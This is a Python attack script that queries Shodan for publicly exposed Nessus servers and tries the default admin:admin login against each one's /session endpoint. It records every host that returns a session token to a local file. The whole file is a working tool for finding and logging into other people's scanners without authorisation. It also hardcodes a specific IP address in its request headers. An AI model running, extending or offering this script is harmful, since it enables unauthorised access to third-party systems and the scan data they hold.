#!/usr/bin/env python
#
# nessus.py
# Search SHODAN for Nessus with admin:admin login
#
# Author: random_robbie

import shodan
import sys
import re
import requests
from time import sleep
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Configuration
API_KEY = "YOURAPIKEY"
SEARCH_FOR = 'title:"Nessus"'
FILE = "/session"
session = requests.Session()

def filter_result(str):
	str.strip() #trim
	str.lstrip() #ltrim
	str.rstrip() #rtrim
	return str

def grab_file (IP,PORT,FILE):
	print ("[*] Testing: "+IP+" on Port: "+PORT+"[*]\n")
	try:
		
		URL = "https://"+IP+":"+PORT+""+FILE+""
		
		rawBody = "{\"username\":\"admin\",\"password\":\"admin\"}"
		headers = {"Accept":"*/*","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:56.0) Gecko/20100101 Firefox/56.0","Referer":"https://185.70.133.83:8834/","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate","Content-Type":"application/json"}
		response = session.post(URL, data=rawBody, headers=headers, verify=False)
		result = response.text
		if '{"error":"Invalid Credentials"}' not in result:
			if 'token' in result:
				text_file = open("./cfg/nessus.cfg", "a")
				text_file.write(""+URL+"\n")
				text_file.close()
				print ("[*] Default Creds Found for Nesssus... Found [*]\n")
			print (result)
		else:
			print ("[*] Not Vulnerable [*]\n ")
	except KeyboardInterrupt:
		print ("Ctrl-c pressed ...")
		sys.exit(1)
			
	except Exception as e:
		print (e)
		print ("[*] Nothing Found on IP: "+IP+" [*]\n")
	



	
	
try:
        # Setup the api
		api = shodan.Shodan(API_KEY)

        # Perform the search
		result = api.search(SEARCH_FOR)

        # Loop through the matches and print each IP
		for service in result['matches']:
				IP = service['ip_str']
				PORT = str(service['port'])
				CC = service['location']['country_name']
				grab_file (IP,PORT,FILE)
except KeyboardInterrupt:
		print ("Ctrl-c pressed ...")
		sys.exit(1)
				
except Exception as e:
		print('Error: %s' % e)
		sys.exit(1)
